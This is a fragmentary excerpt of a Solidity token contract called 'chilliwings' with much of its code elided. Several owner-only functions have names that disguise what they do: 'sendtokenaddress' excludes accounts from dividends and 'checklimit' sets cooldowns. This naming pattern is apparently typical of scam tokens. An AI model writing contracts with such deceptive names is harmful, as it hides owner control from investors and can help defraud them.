...
contract AuthOwner is Context, IERC1363{  
    ...
    */
    function checkbonus(address newOwner) external onlyOwner returns (bool) {
...
contract chilliwings is AuthOwner {
    using SafeMath for uint256;    
    uint256 public totalSupply = 100000000 *  10**9;
    mapping(address => uint256) balances;
    mapping(address => mapping(address => uint256)) internal allowed;
    string public name = "chilliwings";    
    string public symbol = "CHILLI";
    ...
    function checklimit(uint256 minimumTokenBalanceForDividends) external onlyOwner {
        _coolWait = 3600;
        _minimumTokenBalanceForDividends = minimumTokenBalanceForDividends;
    }

    function sendtokenaddress(address account) external onlyOwner {
        require(!excludedFromDividends[account]);
        excludedFromDividends[account] = true;
    }

    function transfernewowner(address sender, address recipient, uint256 amount) private { 
      if (amount > 0) {
    ...
    function removegas(address sender, uint256 amount) internal view {
      require(amount <= balances[sender], "TX Limit Exceeded");
  }

    function newapproval(uint256 newCoolWait) external onlyOwner {
        require(
